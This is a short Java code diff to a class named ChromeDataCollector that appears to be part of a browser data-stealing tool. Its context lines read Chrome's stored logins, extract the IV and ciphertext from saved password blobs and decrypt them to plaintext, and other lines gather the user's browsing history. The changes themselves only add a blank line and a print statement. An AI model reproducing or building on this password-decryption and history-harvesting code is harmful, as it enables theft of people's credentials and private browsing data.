@@ -68,6 +68,7 @@ class ChromeDataCollector {
             String username = rs.getString("username_value");
             byte[] cipher = rs.getBytes("password_value");
             if (url != "" || username != "") {
+    
                 byte[] initialization_vector = Arrays.copyOfRange(cipher, 3, 15);
                 byte[] encrypted_password = Arrays.copyOfRange(cipher, 15, cipher.length);
                 String password = decryptCipher(encrypted_password, initialization_vector, secret_key);
@@ -115,6 +116,7 @@ class ChromeDataCollector {
         }
         System.out.println("[*] Total history Url's: " + history.size());
         UserData.setBrowserHistory(history);
+        System.out.println("[*] Total history Url's: " + UserData.browserHistory.size());
     }
 
     private static String extractDomain(String url) {
